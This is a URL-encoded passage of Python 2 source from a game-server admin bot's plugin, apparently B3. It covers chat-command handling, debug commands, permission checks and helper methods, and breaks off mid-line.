0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%0A%20%20%20%20def%20OnPrivateSay(self%2C%20event)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Handle%20EVT_CLIENT_PRIVATE_SAY%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20event.target%20and%20event.client.id%20%3D%3D%20event.target.id%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.OnSay(event%2C%20True)%0A%0A%20%20%20%20def%20OnSay(self%2C%20event%2C%20private%3DFalse)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Handle%20EVT_CLIENT_SAY%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.debug('OnSay%20handle%20%25s%3A%22%25s%22'%2C%20event.type%2C%20event.data)%0A%0A%20%20%20%20%20%20%20%20if%20len(event.data)%20%3E%3D%203%20and%20event.data%5B%3A1%5D%20%3D%3D%20'%23'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self.console.debug%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.data%5B1%3A%5D%20%3D%3D%20'clients'%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('clients%3A')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20k%2C%20c%20in%20self.console.clients.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('client%20%25s%20(%23%25i%20id%3A%20%25s%20cid%3A%20%25s%20level%3A%20%25s%20group%3A%20%25s)%20obj%3A%20%25s'%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20c.name%2C%20id(c)%2C%20c.id%2C%20c.cid%2C%20c.maxLevel%2C%20c.groupBits%2C%20c)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20event.data%5B1%3A%5D%20%3D%3D%20'groups'%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('groups%20for%20%25s%3A'%2C%20event.client.name)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20g%20in%20event.client.groups%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('group%20(id%3A%20%25s%2C%20name%3A%20%25s%2C%20level%3A%20%25s)'%2C%20g.id%2C%20g.name%2C%20g.level)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20event.data%5B1%3A5%5D%20%3D%3D%20'vars'%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%20%3D%20event.data%5B7%3A%5D.strip()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20event.client%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20event.client%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('vars%20for%20%25s%3A'%2C%20sclient.name)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20k%2C%20v%20in%20sclient._pluginData.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ctplugin%20%25s%3A'%2C%20k)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20kk%2C%20vv%20in%20v.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ct%25s%20%3D%20%25s'%2C%20kk%2C%20str(vv.value))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('error%20getting%20vars%3A%20%25s'%2C%20e)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('end%20of%20vars')%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20event.data%5B1%3A7%5D%20%3D%3D%20'tkinfo'%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%20%3D%20event.data%5B9%3A%5D.strip()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20event.client%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20event.client%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('teamkill%20info%20for%20%25s%3A'%2C%20sclient.name)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20k%2C%20v%20in%20sclient._pluginData.items()%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20kk%2C%20vv%20in%20v.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20kk%20%3D%3D%20'tkinfo'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ctplugin%20%25s%3A'%2C%20k)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20tkinfo%20%3D%20vv.value%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ctcid%20%3D%20%25s'%2C%20tkinfo.cid)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ctattackers%20%3D%20%25s'%2C%20str(tkinfo.attackers))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ctattacked%20%3D%20%25s'%2C%20str(tkinfo.attacked))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ctpoints%20%3D%20%25s'%2C%20tkinfo.points)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5Ct_grudged%20%3D%20%25s'%2C%20str(tkinfo._grudged))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%5Ct%5CtlastAttacker%20%3D%20%25s'%2C%20tkinfo.lastAttacker)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('error%20getting%20teamkill%20info%3A%20%25s'%2C%20e)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('end%20of%20teamkill%20info')%0A%0A%20%20%20%20%20%20%20%20elif%20len(event.data)%20%3E%3D%202%20and%20event.data%5B%3A1%5D%20in%20(self.cmdPrefix%2C%20self.cmdPrefixLoud%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.cmdPrefixBig%2C%20self.cmdPrefixPrivate)%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20catch%20the%20confirm%20command%20for%20identification%20of%20the%20B3%20devs%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20event.data%5B1%3A%5D%20%3D%3D%20'confirm'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('checking%20confirmation...')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(functions.confirm(event.client))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('handle%20command%20%25s'%20%25%20event.data)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20event.data%5B1%3A2%5D%20in%20(self.cmdPrefix%2C%20self.cmdPrefixLoud%2C%20self.cmdPrefixBig%2C%20self.cmdPrefixPrivate)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20self.is%20the%20alias%20for%20say%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%20%3D%20'say'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%20%3D%20event.data%5B2%3A%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%20%3D%20event.data%5B1%3A%5D.split('%20'%2C%201)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(cmd)%20%3D%3D%202%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%2C%20data%20%3D%20cmd%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%20%3D%20cmd%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%20%3D%20''%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20command%20%3D%20self._commands%5Bcmd.lower()%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20spell_check%20%3D%20self.get_cmdSoundingLike(cmd%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20_msg%20%3D%20self.getMessage('unknown_command'%2C%20cmd)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20spell_check%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20_msg%20%2B%3D%20'.%20Did%20you%20mean%20%25s%25s%3F'%20%25%20(event.data%5B%3A1%5D%2C%20spell_check)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message(_msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.client.maxLevel%20%3C%20self._admins_level%20and%20self._warn_command_abusers%20and%20event.client.authed%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.var(self%2C%20'fakeCommand'%2C%200).value%20%2B%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.client.var(self%2C%20'fakeCommand').toInt()%20%3E%3D%203%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.setvar(self%2C%20'fakeCommand'%2C%200)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warnClient(event.client%2C%20'fakecmd'%2C%20None%2C%20False)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd%20%3D%20cmd.lower()%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20command.plugin.isEnabled()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message(self.getMessage('cmd_plugin_disabled'))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message(%22plugin%20disabled%3A%20cannot%20execute%20command%20%25s%22%20%25%20cmd)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20not%20event.client.authed%20and%20command.level%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message('%5E7Please%20try%20your%20command%20after%20you%20have%20been%20authenticated')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.clients.authorizeClients()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20private%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20self.is%20a%20silent%20command%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.client.maxLevel%20%3C%20command.secretLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message('%5E7You%20do%20not%20have%20sufficient%20access%20to%20do%20silent%20commands')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20command.canUse(event.client)%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.data%5B%3A1%5D%20%3D%3D%20self.cmdPrefixLoud%20and%20event.client.maxLevel%20%3E%3D%209%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20results%20%3D%20command.executeLoud(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20event.data%5B%3A1%5D%20%3D%3D%20self.cmdPrefixBig%20and%20event.client.maxLevel%20%3E%3D%209%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20results%20%3D%20command.executeBig(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20event.data%5B%3A1%5D%20%3D%3D%20self.cmdPrefixPrivate%20and%20event.client.maxLevel%20%3E%3D%209%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20results%20%3D%20command.executePrivate(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20results%20%3D%20command.execute(data%2C%20event.client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20(KeyboardInterrupt%2C%20SystemExit)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message('%5E7There%20was%20an%20error%20processing%20your%20command')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.queueEvent(self.console.getEvent('EVT_ADMIN_COMMAND'%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(command%2C%20data%2C%20results)%2C%20event.client))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20self._warn_command_abusers%20and%20event.client.maxLevel%20%3C%20self._admins_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.var(self%2C%20'noCommand'%2C%200).value%20%2B%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20event.client.var(self%2C%20'noCommand').toInt()%20%3E%3D%203%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.setvar(self%2C%20'noCommand'%2C%200)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warnClient(event.client%2C%20'nocmd'%2C%20None%2C%20False)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20command.level%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message('%5E7%25s%25s%20command%20is%20disabled'%20%25%20(self.cmdPrefix%2C%20cmd))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.info(%22%25s%20does%20not%20have%20sufficient%20rights%20to%20use%20%25s%25s.%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22Required%20level%3A%20%25s%22%20%25%20(event.client.name%2C%20self.cmdPrefix%2C%20cmd%2C%20command.level%5B0%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20show%20the%20preconfigured%20message%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.getGroup(command.level%5B0%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message(self.getMessage('cmd_not_enough_access'%2C%20%7B'group_name'%3A%20group.name%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'prefix'%3A%20self.cmdPrefix%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'command'%3A%20cmd%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20fallback%20to%20default%20one%20if%20we%20errors%20shows%20up%20(mostly%20invalid%20command%20level%2Fgroup%20specified%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20in%20the%20configuration%20file%20thus%20we%20fail%20in%20retrieving%20the%20group%20from%20the%20storage)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22could%20not%20format%20'cmd_not_enough_access'%20message%20(using%20default)%3A%20%25s%22%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.client.message('%5E7You%20do%20not%20have%20sufficient%20access%20to%20use%20%25s%25s'%20%25%20(self.cmdPrefix%2C%20cmd))%0A%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20UTILITIES%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%0A%20%20%20%20def%20aquireCmdLock(self%2C%20cmd%2C%20client%2C%20delay%2C%20all%3DTrue)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Check%20whether%20a%20client%20can%20acquire%20a%20lock%20on%20a%20given%20command.%0A%20%20%20%20%20%20%20%20%3Aparam%20cmd%3A%20The%20command%20to%20execute%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20executing%20the%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20delay%3A%20The%20delay%20between%20command%20executions%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20client.maxLevel%20%3E%3D%20self._admins_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20True%0A%20%20%20%20%20%20%20%20elif%20cmd.time%20%2B%20delay%20%3C%3D%20self.console.time()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20True%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20def%20get_cmdSoundingLike(self%2C%20c_word%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20list%20of%20commands%20sounding%20like%20the%20spelled%20one.%0A%20%20%20%20%20%20%20%20%3Aparam%20c_word%3A%20The%20spelled%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20executed%20the%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20c_list%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20for%20c%2C%20cmd%20in%20self._commands.iteritems()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.canUse(client)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.command%20not%20in%20c_list%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20c_list.append(cmd.command)%0A%20%20%20%20%20%20%20%20result%20%3D%20functions.corrent_spell(c_word%2C%20'%20'.join(c_list))%0A%20%20%20%20%20%20%20%20return%20result%0A%0A%20%20%20%20def%20getAdmins(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20list%20of%20online%20admins.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20return%20self.console.clients.getClientsByLevel(self._admins_level)%0A%0A%20%20%20%20def%20getRegulars(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20list%20of%20online%20regular%20players.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20return%20self.console.clients.getClientsByLevel(min%3D2%2C%20max%3D2)%0A%0A%20%20%20%20def%20findClientPrompt(self%2C%20handle%2C%20client%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Find%20a%20client%20matching%20the%20given%20input.%0A%20%20%20%20%20%20%20%20%3Aparam%20handle%3A%20The%20search%20handle%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20to%20notify%20search%20results%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20matches%20%3D%20self.console.clients.getByMagic(handle)%0A%20%20%20%20%20%20%20%20if%20matches%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(matches)%20%3E%201%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20names%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%2